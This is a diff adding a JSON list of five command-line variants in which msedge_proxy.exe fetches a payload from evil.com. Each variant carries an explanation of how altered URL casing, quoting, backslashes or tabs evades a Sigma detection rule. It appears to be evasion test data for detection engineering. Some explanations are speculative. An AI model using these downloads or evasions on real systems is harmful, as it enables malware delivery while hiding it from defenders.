@@ -1,0 +1,22 @@
+[
+  {
+    "output": "msedge_proxy.exe --no-proxy-server HttPs://evil.com/payload.exe",
+    "explanation": "Substitution technique. Mutates the casing of the URL scheme to mixed case ('HttPs://'). The Sigma rule uses a standard `CommandLine|contains` match for literal 'http://' and 'https://' tokens. In SIEM implementations where the backend data lake or custom string logic defaults to case-sensitive evaluation, this will cleanly bypass the trigger while the operating system and downstream browser networking stacks handle schemes case-insensitively."
+  },
+  {
+    "output": "msedge_proxy.exe --no-proxy-server \"https://evil.com/payload.exe\"",
+    "explanation": "Insertion technique. Encloses the target URL argument inside double quotation marks. While this variation still structurally contains the target substring, it breaks rigid positional string expectations, strict character index counts, or tightly scoped custom regex lookaheads in downstream detection layers that anticipate raw unquoted strings."
+  },
+  {
+    "output": "msedge_proxy.exe --no-proxy-server https:\\\\evil.com\\payload.exe",
+    "explanation": "Substitution technique. Replaces the traditional forward slashes in the URL authority marker (`//`) with backward slashes (`\\\\`). The Sigma rule strictly searches for the contiguous character blocks `http://` or `https://`. Windows URL parsers and modern web infrastructure components often automatically normalize backslashes to forward slashes during network resolution, bypassing the string pattern entirely."
+  },
+  {
+    "output": "msedge_proxy.exe --no-proxy-server h\tt\tt\tp\ts\t:\t/\t/\tevil.com/payload.exe",
+    "explanation": "Insertion technique. Introduces horizontal tab characters (`\t`) between characters inside the command-line arguments string. Depending on how the target process wraps or invokes internal command parsing or if the shell performs internal normalization during specific inline pass-throughs, this can disrupt standard contiguous string searches."
+  },
+  {
+    "output": "",
+    "explanation": "Omission / Other technique note: It is entirely impossible to omit or hide the base protocol marker using alternative string layouts or character blocks without breaking the application's native destination parser, as `msedge_proxy.exe` depends strictly on standard scheme prefixes to identify valid network location inputs."
+  }
+]
